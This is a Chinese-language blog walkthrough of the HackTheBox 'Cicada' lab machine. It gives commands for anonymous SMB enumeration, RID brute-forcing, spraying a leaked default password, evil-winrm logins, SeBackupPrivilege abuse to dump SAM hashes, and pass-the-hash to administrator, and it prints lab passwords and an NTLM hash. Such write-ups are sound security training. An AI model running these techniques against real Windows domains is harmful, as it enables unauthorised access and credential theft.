#  HTB靶场通关-1   
原创 摆烂的beizeng  土拨鼠的安全屋   2024-12-31 10:06  
  
## 端口扫描  
```

nmap 10.10.11.35


```  
  
扫描结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia8bjk6KVdtAOcqlLFoWmA0Jibuy0aFIH7jNReIvy1wz04Gm8dGk4JWew/640?wx_fmt=png&from=appmsg "")  
## smb连接  
  
发现开放445端口有smb服务，连接试试  
```

smbclient -L //10.10.11.35

  


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiap6g5B0lgrOTibtBwanNJzlOXzl4cSibRaqb0BcCUnRBrbEoT3lJqk6yw/640?wx_fmt=png&from=appmsg "")  
  
发现需要密码使用免密登录试试  
```

smbclient -N //10.10.11.35

或者

enum4linux -a -u guest 10.10.11.35


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia7RxgUc0lvFiaiaa6PAnA5z93DfI9j8XfLxIUxZAPlM5O2TiactUqsryZg/640?wx_fmt=png&from=appmsg "")  
  
把这个文件下载下来看看  
```

get "Notice from HR.txt"


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiaa1c4b02p1DhiaWKVuv0WMom4U1nWVxMS3EOtGJ42DU1GMFo8QEBkriaA/640?wx_fmt=png&from=appmsg "")  
获取到一个默认的密码Cicada$M6Corpb*@Lp#nZp!8  
## Rid爆破  
  
**crackmapexec **工具使用：  
https://www.cnblogs.com/Yang34/p/14411497.html  
```

crackmapexec smb 10.10.11.35 -u "guest" -p "" --rid-brute|grep "SidTypeUser"

或者

nxc smb 10.10.11.35 -u guest -p '' --rid-brute --users


```  
  
这是两个工具爆破得到的结果  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiaaxYPGQgKOWIC56ZSmZMBjfcN5uQiaDv8jeXFOBFj5ynlaqSob2mAuAA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia9HV0EFNuFU0E5iaicQPn2XlnHL42p9AP6uByNc1xsvDBYS8m7MgJ0PXg/640?wx_fmt=png&from=appmsg "")  
  
其实都是差不多的可以得到用户名列表  
```

john.smouldersarah.danteliamichael.wrightsondavid.oreliousemily.oscars


```  
  
遍历用户名密码看哪个正确  
```

crackmapexec ldap cicada.htb -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'


```  
  
发现对michael.wrightson用户可用  
## enum4linux-ng扫描  
  
使用enum4linux-ng搜集所有与smb服务有关的信息  
```

enum4linux-ng -A -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -t 10


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiapWNbulLZuZ7k38iaJc4cytRgbL2TA1FwvHibwHemFPxTI4WAHTQlj2nw/640?wx_fmt=png&from=appmsg "")  
  
发现了david的密码：aRt$Lp#7t*VQ!3  
  
使用该用户进行smb连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiaH0Qg1RYvXQkrHSGMuvvsUqibdFk19rCqUAhsjs6PQRHlyAtxH4g2qiaA/640?wx_fmt=png&from=appmsg "")  
  
可以看到有一个文件下载下来使用get "文件名"命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiarec2PGGC71GV2wUxev22s1hP5HLiahdia7wjeedlfd0kB7ZNbzibhWSZQ/640?wx_fmt=png&from=appmsg "")  
  
发现了用户名和密码  
## winrm登录  
```

evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35


```  
  
使用evil-winrm 登录得到用户的flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUialYN75ibEM7CGXhHBSUWbUx5nghBZ7nkFVH3ECdEHopMKjUs5Ty1K99A/640?wx_fmt=png&from=appmsg "")  
## SeBackupPrivilege  
  
查看当前用户的权限  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia2CB3nH4nzox61R8xUbvErr9yrqBo2yDknx3icBBOvtjeaGm99REOgqg/640?wx_fmt=png&from=appmsg "")  
  
关于这个 SeBackupPrivilege：  
Windows Privilege Escalation: SeBackupPrivilege – Hacking Articles  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia85eLat9URja0cpjUHvnib35aHzCibKoZnUeLDBExicGulzzApCZ1r9EvQ/640?wx_fmt=png&from=appmsg "")  
## pypykatz  
  
使用 pypykatz 得到 admin 的 hash 值  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiaAgwM2wReypl5Q99fToX8SMsuCRplibmyUAYdnyQcFvzdibeecWRJ0fTw/640?wx_fmt=png&from=appmsg "")  
## impacket-secretsdump  
  
或者使用impacket-secretsdump工具  
```

impacket-secretsdump -sam sam -system system LOCAL


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUiaULibXRC8KZrxwdDXibyz9abqmu8T6uVMrpsax3pK2alGDgJHibfGFibgcw/640?wx_fmt=png&from=appmsg "")  
  
最后使用 evil-winrm  
 的 hash 登录到 admin，得到 root.txt  
```

evil-winrm -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i 10.10.11.35


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OPGiamZ2dJeVdvzuHt9z6yNiaDCG6gkfUia6dicfkTYU1hoBXq69YiakydwLnfXjFcU80fhzKTUvIf92N0GoJNroJIA/640?wx_fmt=png&from=appmsg "")  
  
  
  
